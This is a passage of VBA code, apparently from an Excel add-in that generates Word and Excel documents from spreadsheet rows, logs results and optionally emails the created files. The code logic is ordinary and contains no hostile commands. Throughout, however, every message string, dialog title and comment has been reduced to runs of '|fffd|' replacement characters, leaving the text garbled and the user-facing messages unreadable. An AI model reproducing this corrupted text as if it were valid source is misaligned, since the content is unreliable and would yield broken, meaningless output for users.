            msg$ = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & BaseCol& & vbNewLine & _
                   "(|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                   "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        End If
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        ShowSettingsPage
        F_Settings.MultiPage_Options.value = 2
        F_Settings.ComboBox_BaseColumn.SetFocus
        Exit Sub
    Else
        Set ra = newRa.EntireRow
    End If

    If Not SETT.GetBoolean("CheckBox_UseAllRows") Then
        Set ra = Intersect(Selection.EntireRow, Selection.EntireRow, ra.EntireRow)
    End If


    Err.Clear
    Set ra = SpecialCells_VisibleRows(ra).EntireRow
    If ra Is Nothing Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
               " -   |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & HEADER_ROW & "," & vbNewLine & _
               " -   |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ColumnNameByColumnNumber(BaseCol&) & _
               " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
               "(|fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        MsgBox msg, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If
    'If ra Is Nothing Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd|": End

    Set ra = Intersect(ra.EntireRow, ra.EntireRow)
    rc& = Intersect(Columns(1), ra).Cells.Count

    If SETT.GetBoolean("CheckBox_SelectTemplates") Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Set SelectedTemplates = TemplatesFilenames
        SelectedRowsCount& = rc&
        F_Templates.Show
        If SelectedTemplates.Count = 0 Then Exit Sub
        Set TemplatesFilenames = SelectedTemplates
    End If

    Set ExcelTablesToBeClosed = New Collection
    Application.ScreenUpdating = False
    Set CombineXLScollection = New Collection
    Dim pi2 As ProgressIndicator, res As Boolean, template$
    Set Main_PI = New ProgressIndicator
    Main_PI.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , 3

    Main_PI.StartNewAction 2, 4, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word ..."        ' , , , rc&

    Dim NeedWord As Boolean, WordAlreadyOpen As Boolean
    For Each item In TemplatesFilenames
        NeedWord = NeedWord Or (TemplateType(item) Like "DOC*")
    Next

    If NeedWord Then
        Set WA = GetObject(, "Word.Application")
        If WA Is Nothing Then Set WA = CreateObject("Word.Application") Else WordAlreadyOpen = True
        If WA Is Nothing Then
            msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word," & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, Microsoft Word |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
            MsgBox msg$, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word"
            Exit Sub
        End If
        WA.Visible = False
    End If

    Main_PI.StartNewAction 4, 6, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."        ', , , rc&

    Dim options As Dictionary, FilesCreated&, FilesFailed&, KeysRange As Range, HLcell As Range, Blocks As Collection
    Set KeysRange = SpecialCells_TypeConstants(ActiveSheet.Rows(HEADER_ROW))

    If KeysRange Is Nothing Then
        Main_PI.Hide
        Application.ScreenUpdating = True
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
               "(|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & HEADER_ROW & ")" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
               vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        F_Settings.MultiPage_Options.value = 2
        F_Settings.Label_HeaderRow.Font.Bold = True: F_Settings.Label_HeaderRow.ForeColor = vbRed
        Exit Sub
    End If

    Dim LS As New Letters, Lett As Letter, MULTIROW_MODE As Boolean, pi_msg$, LogRows As Collection, LogTemplate$
    Dim TemplatesFilenamesForRow As Collection, HL_text$
    MULTIROW_MODE = SETT.GetBoolean("CheckBox_MultiRow")

    If MULTIROW_MODE Then        ' |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        Set Blocks = CollectionOfRowsBlocks(ra)
        If Blocks.Count = 0 Then GoTo EndFor
        rc& = Blocks.Count
    End If

    Main_PI.StartNewAction 6, , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...", , , rc&
    Application.ScreenUpdating = False

    HL_text$ = SETT.GetText("TextBox_HyperlinkText")

    If SETT.GetBoolean("CheckBox_EnableLog") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        Set LogRows = New Collection
        Const LOG_SEP = "&!!&"
        LogTemplate$ = Replace(SETT.GetText("TextBox_LogRowTemplate"), "|", LOG_SEP)
    End If

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For Each ro In IIf(MULTIROW_MODE, Blocks, ra.Rows)

        If MULTIROW_MODE Then        ' |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Main_PI.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
            Set options = ReadMultirowOptions(ro.EntireRow)
            pi_msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & ro.Address & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel"

        Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
            Main_PI.SubAction , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", "$time"
            Set options = ReadOptions(ro)
            pi_msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & ro.Row & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel"
        End If
        Set SourceRows = ro.EntireRow        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Multirow

        If SETT.GetBoolean("CheckBox_EnableLog") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            LogRows.Add RenderString(LogTemplate$, options)
        End If

        Set Lett = LS.CreateNewLetter: Lett.Render options: Set Lett.SourceRow = ro

        Set TemplatesFilenamesForRow = New Collection
        Set TemplatesFilenamesForRow = ApplyTemplatesFilter(TemplatesFilenames, ro)

        If TemplatesFilenames.Count Then
            Main_PI.Log "": Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & pi_msg$
        Else
            If SETT.GetBoolean("CheckBox_SendEmail") Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|: " & Lett.Email
        End If

        Set pi2 = Main_PI.AddChildIndicator("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & pi_msg$)
        pi2.StartNewAction , , , , , TemplatesFilenamesForRow.Count + O

        If SETT.GetBoolean("CheckBox_TemplatesFilter_Enabled") Then
            ' If TemplatesFilenamesForRow.Count < TemplatesFilenames.Count Then
            Main_PI.Log "  |fffd||fffd||fffd||fffd||fffd||368||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  " & _
                        TemplatesFilenamesForRow.Count & " |fffd||fffd| " & TemplatesFilenames.Count
        End If

        Dim i&, NewFilename$, commonFilename$

        For i = 1 To TemplatesFilenamesForRow.Count        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            template$ = TemplatesFilenamesForRow(i): Err.Clear
            pi2.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count"

            Main_PI.Log vbTab & String(40, "=")
            Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & i & " |fffd||fffd| " & TemplatesFilenamesForRow.Count
            Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Replace(template$, TEMPLATES_FOLDER$, "...\")


            NewFilename$ = "": NewFilename$ = CreatePathForFile(template$, options)
            res = CreateAndFillDocument(template$, options, pi2)

            Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & IIf(res, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|")
            If Err <> 0 Then Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & vbTab & Err.Description
            If SETT.GetBoolean("CheckBox_SendEmail") Then Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|: " & Lett.Email

            If SETT.GetBoolean("CheckBox_Mail_AttachCreatedFiles") Then _
               Lett.AddAttachment NewFilename$, RenderString(SETT.GetText("TextBox_AttachCreatedFilesMask"), options)

            If res And SETT.GetBoolean("CheckBox_AddHyperlinks") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                Set HLcell = Nothing
                Set HLcell = Intersect(Get_HLink_Column(template$, KeysRange), ro)
                HLcell.Hyperlinks.Add HLcell, NewFilename$, , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|" & vbLf & Dir(NewFilename$), HL_text$
            End If
            Err.Clear

            FilesCreated& = FilesCreated& - res
            FilesFailed& = FilesFailed& - (Not res)
            If StopMacro Then
                msg$ = vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                pi2.Hide: Main_PI.Log msg: GoTo EndFor
            End If
        Next i
        pi2.Hide
        If TemplatesFilenamesForRow.Count Then Main_PI.Log vbTab & String(40, "=")
    Next ro
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    If SETT.GetBoolean("CheckBox_CombineXLSsheets") Then
        If Not SETT.GetBoolean("CheckBox_PDF") Then
            If CombineXLScollection.Count Then
                Main_PI.StartNewAction 98, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd| ..."
                commonFilename$ = CombineXLSsheets(CombineXLScollection)
                If Len(commonFilename$) Then
                    Main_PI.Log "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|" & vbNewLine & commonFilename$
                End If
            End If
        End If
    End If

    If SETT.GetBoolean("CheckBox_EnableLog") Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        If LogRows.Count Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|

            Dim LogFilename$, LogWB As Workbook, LogSheet As Worksheet, LogRow As Variant
            LogFilename$ = SETT.GetText("TextBox_LogFilename")
            Main_PI.StartNewAction 99, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|", LogFilename$
            Main_PI.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|" & vbNewLine & LogFilename$

            If FWF.FileExists(LogFilename$) Then
                Set LogWB = GetObject(LogFilename$)
                If LogWB Is Nothing Then
                    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|" & vbNewLine & LogFilename$, vbExclamation, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
                Else
                    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    Application.ScreenUpdating = False
                    LogWB.Windows(1).Visible = True
                    Set LogSheet = LogWB.Worksheets(1)

                    For Each item In LogRows
                        LogRow = "": LogRow = Split(item, LOG_SEP)
                        If IsArray(LogRow) Then
                            If LogRow(0) = "" Then LogRow(0) = " "
                            With LogSheet.Range("a" & LogSheet.Rows.Count).End(xlUp).Offset(1).Resize(, UBound(LogRow) + 1)
                                .value = LogRow
                            End With
                        End If
                    Next
                    LogWB.Close True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
                    Main_PI.Log "|fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (" & LogRows.Count & ")"
                End If
            Else
                MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|" & vbNewLine & LogFilename$, vbExclamation, "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            End If
        End If
    End If


EndFor:
    Application.DisplayAlerts = False
    For Each item In ExcelTablesToBeClosed
        Workbooks(CStr(item)).Close False
    Next
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True

    Dim SendErr$
    If SETT.GetBoolean("CheckBox_SendEmail") Then
        res = LS.SendAll(SendErr$)
        If Len(SendErr$) Then
            Main_PI.Log vbTab: Main_PI.Log vbTab & SendErr$
        Else
            Main_PI.Log vbTab: Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & IIf(res, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|")
        End If
    End If

    If Not WordAlreadyOpen Then
        WA.Quit        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Else
        WA.Visible = True
    End If
    Set WA = Nothing

    AppActivate Application.Name
    Main_PI.StartNewAction 100, 100, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & FilesCreated & " |fffd||fffd| " & FilesCreated + FilesFailed&, _
